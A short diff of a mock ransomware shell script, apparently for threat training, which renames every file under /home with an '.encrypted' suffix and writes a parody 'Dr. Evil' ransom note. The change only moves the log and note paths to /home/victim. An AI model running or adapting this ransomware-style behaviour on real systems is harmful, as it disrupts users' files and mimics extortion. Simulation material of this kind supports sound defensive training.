@@ -3,7 +3,7 @@
 for file in /home/**/*; do
     if [ -f "$file" ]; then #checks the item is a file, and not a directory
         mv "$file" "${file}.encrypted" #appends to end of filename
-        echo "Encrypted: $file" >> /home/threattrain/encryption_log.txt
+        echo "Encrypted: $file" >> /home/victim/encryption_log.txt
     fi
 done
 
@@ -18,5 +18,5 @@ Now, listen carefully, I demand the sum of... ONE MILLION DOLLARS! Well, not rea
 \nTick-tock, tick-tock, you have 48 hours! And remember, no funny business! I've got sharks with frickin' laser beams!\n\
 \nThrow me a frickin' bone here, and pay the ransom!!!\n\
 \nCheerio,\n\
-Dr. Evil." >> /home/threattrain/README.txt
+Dr. Evil." >> /home/victim/README.txt
 
